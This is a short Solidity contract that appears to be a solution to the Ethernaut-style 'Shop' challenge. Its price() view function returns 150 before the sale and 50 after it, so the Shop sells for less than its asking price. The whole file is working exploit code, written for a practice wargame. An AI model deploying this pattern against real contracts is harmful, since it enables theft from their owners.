// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Shop, Buyer} from "./Shop.sol";

contract BuyerAttack is Buyer {
    Shop public shop;

    constructor(Shop _shop) {
        shop = _shop;
    }

    function price() external view returns (uint) {
        if (shop.isSold()) {
            return 50;
        }
        return 150;
    }

    function attack() public {
        shop.buy();
    }
}
